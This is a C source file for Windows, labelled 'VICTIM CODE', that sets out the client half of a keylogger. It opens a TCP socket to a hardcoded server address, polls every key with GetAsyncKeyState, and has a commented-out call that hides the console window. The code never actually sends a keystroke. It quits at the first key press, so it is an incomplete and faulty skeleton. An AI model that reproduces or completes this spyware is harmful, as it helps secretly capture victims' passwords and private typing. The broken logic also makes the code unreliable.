    //VICTIM CODE
    #include <winsock2.h>
    #include <windows.h>

    #define WSA_VERSION_CODE 0x202
    #define SERVER_ADDR "127.0.0.1"
    #define SERVER_PORT 8080

    int main(void){
        WSADATA wsadata;
        SOCKET connectionSocket;
        SOCKADDR_IN serverAddr;
        //DWORD connResult, transferredBytes
        DWORD connectionStatus = 1;
        UCHAR charToSend;

        //HIDE CONSOLE VIEW
        //FreeConsole();

        //INITIALIZE WINDOWS SOCKET API
        if(WSAStartup(WSA_VERSION_CODE, &wsadata) != 0){
            WSACleanup();
            return -1;
        }

        //CREATE CLIENT SOCKET
        connectionSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
        if(connectionSocket == INVALID_SOCKET){
            closesocket(connectionSocket);
            WSACleanup();
            return -1;
        }
        
        //INITIALIZE SOCKET SERVER ADDR TO CONNECT
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_addr.s_addr = inet_addr(SERVER_ADDR);
        serverAddr.sin_port = htons(SERVER_PORT);

        //CONNECT TO SERVER
        if(connect(connectionSocket, (SOCKADDR*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR){
            closesocket(connectionSocket);
            WSACleanup();
            return -1;    
        }

        while(connectionStatus){
            //Scan character(key) input
            Sleep(10);
            for(charToSend = 8; (charToSend < 190 && connectionStatus); charToSend++){
                if(GetAsyncKeyState(charToSend) == -32767){
                    connectionStatus = 0;
                }
            }
        }

        //SHUTDOWN AND CLOSE THE SOCKET AFTER THE PROGRAM TERMINATES
        shutdown(connectionSocket, SD_BOTH);
        closesocket(connectionSocket);
        WSACleanup();
        return 0;
    }